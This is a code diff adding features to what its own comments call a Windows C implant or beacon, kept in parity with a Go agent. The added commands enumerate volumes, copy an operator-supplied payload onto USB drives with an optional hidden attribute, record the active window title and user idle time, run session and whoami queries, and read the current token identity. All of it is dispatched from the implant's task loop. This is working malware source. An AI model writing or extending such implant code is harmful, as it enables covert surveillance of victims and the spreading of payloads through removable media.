@@ -2961,6 +2961,405 @@ static char *do_drives(DWORD *outlen) {
     return buf;
 }
 
+/* ---------- volume / session / token recon (Go-agent parity) ---------- */
+
+/* Same names as the Go agent's driveTypeName, so a parser (or an operator)
+ * that reads one implant's table reads the other's. */
+static const char *go_drive_type_name(DWORD dt) {
+    switch (dt) {
+    case DRIVE_REMOVABLE: return "removable";
+    case DRIVE_FIXED: return "fixed";
+    case DRIVE_REMOTE: return "remote";
+    case DRIVE_CDROM: return "cdrom";
+    case DRIVE_RAMDISK: return "ram";
+    case DRIVE_NO_ROOT_DIR: return "no_root";
+    default: return "unknown";
+    }
+}
+
+#define CBEACON_VOL_MAX 26
+
+typedef struct {
+    char root[4];                 /* "C:\" */
+    DWORD kind;                   /* GetDriveTypeA value */
+    int has_space;
+    unsigned long long free_bytes;
+    unsigned long long total_bytes;
+    char label[64];               /* empty when the volume has none */
+} cbeacon_volume;
+
+/* Letter-mask enumeration mirroring the Go agent: GetLogicalDrives, then one
+ * GetDriveType / GetDiskFreeSpaceEx / GetVolumeInformation pass per volume. */
+static int enum_volumes(cbeacon_volume *vols) {
+    DWORD mask = GetLogicalDrives();
+    int n = 0;
+    int i;
+    for (i = 0; i < 26; i++) {
+        cbeacon_volume *v;
+        ULARGE_INTEGER avail, total, total_free;
+        if ((mask & (1u << i)) == 0) continue;
+        if (n >= CBEACON_VOL_MAX) break;
+        v = &vols[n++];
+        memset(v, 0, sizeof(*v));
+        _snprintf(v->root, sizeof(v->root), "%c:\\", 'A' + i);
+        v->kind = GetDriveTypeA(v->root);
+        avail.QuadPart = 0;
+        total.QuadPart = 0;
+        total_free.QuadPart = 0;
+        if (GetDiskFreeSpaceExA(v->root, &avail, &total, &total_free)) {
+            v->has_space = 1;
+            v->free_bytes = (unsigned long long)avail.QuadPart;
+            v->total_bytes = (unsigned long long)total.QuadPart;
+        }
+        GetVolumeInformationA(v->root, v->label, (DWORD)sizeof(v->label),
+                              NULL, NULL, NULL, NULL, 0);
+    }
+    return n;
+}
+
+/* usb_enum: the Go agent's volume table, byte for byte — including the leading
+ * empty column its row format carries. */
+static char *do_usb_enum(DWORD *outlen) {
+    cbeacon_volume vols[CBEACON_VOL_MAX];
+    char *buf;
+    size_t cap = 8192, len = 0;
+    int n, i;
+    n = enum_volumes(vols);
+    if (n == 0) {
+        buf = (char *)malloc(64);
+        if (!buf) return NULL;
+        strcpy_s(buf, 64, "usb_enum: no logical drives returned");
+        if (outlen) *outlen = (DWORD)strlen(buf);
+        return buf;
+    }
+    buf = (char *)malloc(cap);
+    if (!buf) return NULL;
+    len += (size_t)_snprintf(buf + len, cap - len, "=== volume enum (Windows GetDriveType) ===\n");
+    len += (size_t)_snprintf(buf + len, cap - len, "root\ttype\tlabel\tfree\ttotal\n");
+    for (i = 0; i < n && len + 160 < cap; i++) {
+        len += (size_t)_snprintf(buf + len, cap - len, "\t%s\t%s\t%s\t%llu\t%llu\n",
+            vols[i].root, go_drive_type_name(vols[i].kind), vols[i].label,
+            vols[i].free_bytes, vols[i].total_bytes);
+    }
+    if (outlen) *outlen = (DWORD)len;
+    return buf;
+}
+
+/* "E:\" for "E:\dir", "e:" or a relative path (resolved against the CWD),
+ * mirroring the Go agent's winVolumeRoot. */
+static void volume_root_of(const char *path, char *out, size_t cap) {
+    char full[MAX_PATH + 1];
+    if (path[0] && path[1] == ':') {
+        _snprintf(out, cap, "%c:\\", path[0]);
+        return;
+    }
+    full[0] = '\0';
+    _fullpath(full, path, sizeof(full));
+    if (full[0] && full[1] == ':') {
+        _snprintf(out, cap, "%c:\\", full[0]);
+        return;
+    }
+    strcpy_s(out, cap, full[0] ? full : path);
+}
+
+static int is_removable_root(const char *root) {
+    cbeacon_volume vols[CBEACON_VOL_MAX];
+    int n = enum_volumes(vols);
+    int i;
+    for (i = 0; i < n; i++) {
+        if (vols[i].kind == DRIVE_REMOVABLE && _stricmp(vols[i].root, root) == 0) return 1;
+    }
+    return 0;
+}
+
+/* Same file test as the Go agent's sameFilePath: absolute, cleaned paths
+ * compared case-insensitively (Windows paths are case-insensitive). */
+static int same_module_path(const char *src) {
+    char mod[MAX_PATH + 1];
+    char a[MAX_PATH + 1], b[MAX_PATH + 1];
+    DWORD n = GetModuleFileNameA(NULL, mod, sizeof(mod));
+    if (n == 0 || n >= sizeof(mod)) return 0;
+    a[0] = '\0';
+    b[0] = '\0';
+    if (!_fullpath(a, mod, sizeof(a))) return 0;
+    if (!_fullpath(b, src, sizeof(b))) return 0;
+    return _stricmp(a, b) == 0;
+}
+
+/* usb_drop: copy an operator-supplied payload to a removable volume. Refuses
+ * to copy the running implant and fails closed when no removable volume is
+ * mounted (the Go agent has the same two guards). errbuf receives the exact
+ * reason; a non-NULL return is the success message. */
+static char *do_usb_drop(const char *src, const char *dest, int hide,
+                         char *errbuf, size_t errcap) {
+    cbeacon_volume vols[CBEACON_VOL_MAX];
+    DWORD attrs;
+    char root[MAX_PATH + 1];
+    char dst[MAX_PATH + 1];
+    const char *base;
+    unsigned long long copied = 0;
+    HANDLE in, out;
+    int n, i;
+
+    root[0] = '\0';
+    attrs = GetFileAttributesA(src);
+    if (attrs == INVALID_FILE_ATTRIBUTES) {
+        _snprintf(errbuf, errcap, "usb_drop: source: cannot stat %s (error %lu)", src, GetLastError());
+        return NULL;
+    }
+
+    if (dest && dest[0]) {
+        volume_root_of(dest, root, sizeof(root));
+        if (!is_removable_root(root)) {
+            _snprintf(errbuf, errcap, "usb_drop: destination %s is not a removable volume", dest);
+            return NULL;
+        }
+    } else {
+        n = enum_volumes(vols);
+        for (i = 0; i < n; i++) {
+            if (vols[i].kind == DRIVE_REMOVABLE) {
+                strcpy_s(root, sizeof(root), vols[i].root);
+                break;
+            }
+        }
+        if (!root[0]) {
+            _snprintf(errbuf, errcap, "usb_drop: no removable volume mounted");
+            return NULL;
+        }
+    }
+
+    if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
+        _snprintf(errbuf, errcap, "usb_drop copy: source is not a regular file");
+        return NULL;
+    }
+
+    base = src;
+    {
+        const char *p;
+        for (p = src; *p; p++) {
+            if (*p == '\\' || *p == '/') base = p + 1;
+        }
+    }
+    if (!base[0] || strcmp(base, ".") == 0 || strcmp(base, "..") == 0) base = "payload.bin";
+    if (_snprintf(dst, sizeof(dst), "%s%s", root, base) <= 0) {
+        _snprintf(errbuf, errcap, "usb_drop copy: destination path is too long");
+        return NULL;
+    }
+
+    in = CreateFileA(src, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+                     OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (in == INVALID_HANDLE_VALUE) {
+        _snprintf(errbuf, errcap, "usb_drop copy: cannot open %s (error %lu)", src, GetLastError());
+        return NULL;
+    }
+    out = CreateFileA(dst, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
+                      FILE_ATTRIBUTE_NORMAL, NULL);
+    if (out == INVALID_HANDLE_VALUE) {
+        DWORD e = GetLastError();
+        CloseHandle(in);
+        _snprintf(errbuf, errcap, "usb_drop copy: cannot create %s (error %lu)", dst, e);
+        return NULL;
+    }
+    {
+        BYTE chunk[65536];
+        DWORD got = 0, wrote = 0, e = 0;
+        int ok = 1;
+        for (;;) {
+            if (!ReadFile(in, chunk, (DWORD)sizeof(chunk), &got, NULL)) { ok = 0; e = GetLastError(); break; }
+            if (got == 0) break;
+            if (!WriteFile(out, chunk, got, &wrote, NULL) || wrote != got) { ok = 0; e = GetLastError(); break; }
+            copied += (unsigned long long)got;
+        }
+        CloseHandle(in);
+        CloseHandle(out);
+        if (!ok) {
+            _snprintf(errbuf, errcap, "usb_drop copy: write to %s failed (error %lu)", dst, e);
+            return NULL;
+        }
+    }
+    if (hide) {
+        SetFileAttributesA(dst, FILE_ATTRIBUTE_HIDDEN);
+    }
+    {
+        char *ret = (char *)malloc(1024);
+        if (!ret) {
+            _snprintf(errbuf, errcap, "usb_drop failed");
+            return NULL;
+        }
+        _snprintf(ret, 1024, "usb_drop: copied %llu bytes to %s hide=%s",
+                  copied, dst, hide ? "true" : "false");
+        return ret;
+    }
+}
+
+/* strings.TrimSpace over the ASCII whitespace that can reach a task field. */
+static void trim_inplace(char *s) {
+    size_t n;
+    char *p = s;
+    if (!s) return;
+    while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
+    if (p != s) memmove(s, p, strlen(p) + 1);
+    n = strlen(s);
+    while (n > 0 && (s[n - 1] == ' ' || s[n - 1] == '\t' || s[n - 1] == '\r' || s[n - 1] == '\n')) {
+        s[--n] = '\0';
+    }
+}
+
+/* Case-insensitive "hide=1" search over the task data, matching the Go
+ * agent's strings.Contains(strings.ToLower(task.Data), "hide=1"). */
+static int data_has_hide_flag(const char *data) {
+    char tmp[256];
+    size_t i;
+    if (!data) return 0;
+    for (i = 0; i + 1 < sizeof(tmp) && data[i]; i++) {
+        char c = data[i];
+        tmp[i] = (c >= 'A' && c <= 'Z') ? (char)(c + 32) : c;
+    }
+    tmp[i] = '\0';
+    return strstr(tmp, "hide=1") != NULL;
+}
+
+/* session_recon: console session, foreground window, idle time and the
+ * query/qwinsta/whoami sections — same layout as the Go agent. */
+static char *do_session_recon(DWORD *outlen) {
+    const size_t cap = 16384;
+    char *buf = (char *)malloc(cap);
+    size_t len = 0;
+    static const char *const cmds[] = { "query user", "qwinsta", "whoami /upn", "whoami" };
+    int i;
+    if (!buf) return NULL;
+
+    len += (size_t)_snprintf(buf + len, cap - len, "=== session recon (Windows) ===\n");
+    len += (size_t)_snprintf(buf + len, cap - len, "console_session_id=%lu\n",
+                             (unsigned long)WTSGetActiveConsoleSessionId());
+    {
+        char title[1024];
+        WCHAR wtitle[512];
+        HWND hwnd = GetForegroundWindow();
+        title[0] = '\0';
+        if (hwnd && GetWindowTextW(hwnd, wtitle, (int)(sizeof(wtitle) / sizeof(wtitle[0]))) > 0) {
+            if (WideCharToMultiByte(CP_UTF8, 0, wtitle, -1, title, (int)sizeof(title) - 1, NULL, NULL) <= 0) {
+                title[0] = '\0';
+            }
+            title[sizeof(title) - 1] = '\0';
+        }
+        len += (size_t)_snprintf(buf + len, cap - len, "active_window=%s\n", title);
+    }
+    {
+        LASTINPUTINFO li;
+        li.cbSize = sizeof(li);
+        if (GetLastInputInfo(&li)) {
+            DWORD tick = GetTickCount();
+            len += (size_t)_snprintf(buf + len, cap - len, "idle_ms=%lu\n",
+                                     (unsigned long)(DWORD)(tick - li.dwTime));
+        } else {
+            len += (size_t)_snprintf(buf + len, cap - len, "idle_ms=(GetLastInputInfo failed)\n");
+        }
+    }
+    for (i = 0; i < (int)(sizeof(cmds) / sizeof(cmds[0])); i++) {
+        DWORD n = 0;
+        char *out;
+        if (len + 2048 >= cap) break;
+        out = exec_shell_full(cmds[i], NULL, &n);
+        len += (size_t)_snprintf(buf + len, cap - len, "\n--- %s ---\n", cmds[i]);
+        if (out && n > 0) {
+            size_t avail = cap - len - 1;
+            size_t take = (size_t)n < avail ? (size_t)n : avail;
+            memcpy(buf + len, out, take);
+            len += take;
+            if (take == 0 || buf[len - 1] != '\n') {
+                if (len + 1 < cap) buf[len++] = '\n';
+            }
+            buf[len] = '\0';
+        } else {
+            len += (size_t)_snprintf(buf + len, cap - len, "(failed: no output)\n");
+        }
+        if (out) free(out);
+    }
+    if (outlen) *outlen = (DWORD)len;
+    return buf;
+}
+
+/* token_whoami: the identity of the current thread (or process) token as JSON,
+ * the same shape as the Go agent (`{"whoami":"DOMAIN\\user"}`). */
+static char *json_whoami(const char *who, DWORD *outlen) {
+    char *esc = jescape(who, strlen(who));
+    char *out;
+    size_t need;
+    if (!esc) return NULL;
+    need = strlen(esc) + 32;
+    out = (char *)malloc(need);
+    if (!out) {
+        free(esc);
+        return NULL;
+    }
+    sprintf_s(out, need, "{\"whoami\":\"%s\"}", esc);
+    free(esc);
+    if (outlen) *outlen = (DWORD)strlen(out);
+    return out;
+}
+
+static void wide_to_utf8_n(const WCHAR *w, int wlen, char *out, size_t cap) {
+    int n;
+    if (cap == 0) return;
+    if (wlen < 0) wlen = 0;
+    n = WideCharToMultiByte(CP_UTF8, 0, w, wlen, out, (int)cap - 1, NULL, NULL);
+    if (n < 0) n = 0;
+    out[n] = '\0';
+}
+
+static char *do_token_whoami(DWORD *outlen) {
+    HANDLE hToken = NULL;
+    DWORD need = 0;
+    BYTE *tbuf;
+    WCHAR name[256], dom[256];
+    DWORD nl = (DWORD)(sizeof(name) / sizeof(name[0]));
+    DWORD dl = (DWORD)(sizeof(dom) / sizeof(dom[0]));
+    SID_NAME_USE use;
+
+    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+            return json_whoami("(unknown)", outlen);
+        }
+    }
+    (void)GetTokenInformation(hToken, TokenUser, NULL, 0, &need);
+    if (need == 0) {
+        CloseHandle(hToken);
+        return json_whoami("(unknown)", outlen);
+    }
+    tbuf = (BYTE *)malloc(need);
+    if (!tbuf) {
+        CloseHandle(hToken);
+        return NULL;
+    }
+    if (!GetTokenInformation(hToken, TokenUser, tbuf, need, &need)) {
+        free(tbuf);
+        CloseHandle(hToken);
+        return json_whoami("(query failed)", outlen);
+    }
+    if (((PTOKEN_USER)tbuf)->User.Sid == NULL) {
+        free(tbuf);
+        CloseHandle(hToken);
+        return json_whoami("(null sid)", outlen);
+    }
+    if (!LookupAccountSidW(NULL, ((PTOKEN_USER)tbuf)->User.Sid, name, &nl, dom, &dl, &use)) {
+        free(tbuf);
+        CloseHandle(hToken);
+        return json_whoami("(lookup failed)", outlen);
+    }
+    free(tbuf);
+    CloseHandle(hToken);
+    {
+        char uname[512], udom[256], joined[768];
+        wide_to_utf8_n(dom, (int)dl, udom, sizeof(udom));
+        wide_to_utf8_n(name, (int)nl, uname, sizeof(uname));
+        /* The separator is always present, like the Go agent's
+         * UTF16ToString(dom) + "\\" + UTF16ToString(name). */
+        _snprintf(joined, sizeof(joined), "%s\\%s", udom, uname);
+        return json_whoami(joined, outlen);
+    }
+}
+
 /* UTF-16 text -> UTF-8 (allocated), capped so a hostile/huge clipboard cannot
  * cost the beacon unbounded memory. *outlen excludes the NUL. */
 static char *utf16_to_utf8_alloc(const WCHAR *w, DWORD *outlen, const char **err) {
@@ -3953,6 +4352,61 @@ int main(void) {
                                                     free(out);
                                                 }
                                                 if (!robj) robj = emit_error_result(t.id, "drives", "drive enumeration failed", rid);
+                                            } else if (strcmp(t.type, "usb_enum") == 0) {
+                                                DWORD olen = 0;
+                                                char *out = do_usb_enum(&olen);
+                                                if (out) {
+                                                    robj = emit_text_result(t.id, "usb_enum", out, rid);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "usb_enum", "usb_enum failed", rid);
+                                            } else if (strcmp(t.type, "usb_drop") == 0) {
+                                                /* Go-agent dispatch: path is the source and command the
+                                                 * destination; a one-argument call puts the source in
+                                                 * command and the destination stays empty (first
+                                                 * removable volume). */
+                                                char *src = t.path ? t.path : (char *)"";
+                                                char *dest = t.command ? t.command : (char *)"";
+                                                trim_inplace(src);
+                                                trim_inplace(dest);
+                                                if (!src[0]) {
+                                                    src = dest;
+                                                    dest = (char *)"";
+                                                }
+                                                if (!src[0]) {
+                                                    robj = emit_error_result(t.id, "usb_drop",
+                                                        "usb_drop: source path required (refuses to copy the implant binary)", rid);
+                                                } else if (same_module_path(src)) {
+                                                    robj = emit_error_result(t.id, "usb_drop",
+                                                        "usb_drop: refused to copy the implant executable; pass an explicit payload path", rid);
+                                                } else {
+                                                    char errbuf[512];
+                                                    char *out;
+                                                    errbuf[0] = '\0';
+                                                    out = do_usb_drop(src, dest, data_has_hide_flag(t.data), errbuf, sizeof(errbuf));
+                                                    if (out) {
+                                                        robj = emit_text_result(t.id, "usb_drop", out, rid);
+                                                        free(out);
+                                                    }
+                                                    if (!robj) robj = emit_error_result(t.id, "usb_drop",
+                                                        errbuf[0] ? errbuf : "usb_drop failed", rid);
+                                                }
+                                            } else if (strcmp(t.type, "session_recon") == 0) {
+                                                DWORD olen = 0;
+                                                char *out = do_session_recon(&olen);
+                                                if (out) {
+                                                    robj = emit_text_result(t.id, "session_recon", out, rid);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "session_recon", "session recon failed", rid);
+                                            } else if (strcmp(t.type, "token_whoami") == 0) {
+                                                DWORD olen = 0;
+                                                char *out = do_token_whoami(&olen);
+                                                if (out) {
+                                                    robj = emit_text_result(t.id, "token_whoami", out, rid);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, "token_whoami", "token_whoami failed", rid);
                                             } else if (strcmp(t.type, "find") == 0) {
                                                 const char *root = (t.path && t.path[0]) ? t.path : NULL;
                                                 DWORD olen = 0;
